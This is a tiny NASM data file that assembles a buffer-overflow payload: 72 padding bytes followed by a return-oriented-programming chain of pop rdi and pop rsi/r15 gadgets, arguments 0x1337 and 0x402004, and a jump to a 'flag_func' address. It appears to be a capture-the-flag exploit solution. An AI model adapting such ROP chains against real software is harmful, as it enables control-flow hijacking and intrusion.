pop_rdi     equ 0x4013f3
pop_rsi_r15 equ 0x4013f1
flag_func   equ 0x401256

db 0x41, 0x0a
times 72 db 0x30
dq pop_rdi
dq 0x1337
dq pop_rsi_r15
dq 0x402004
dq 0
dq flag_func
db 0x0a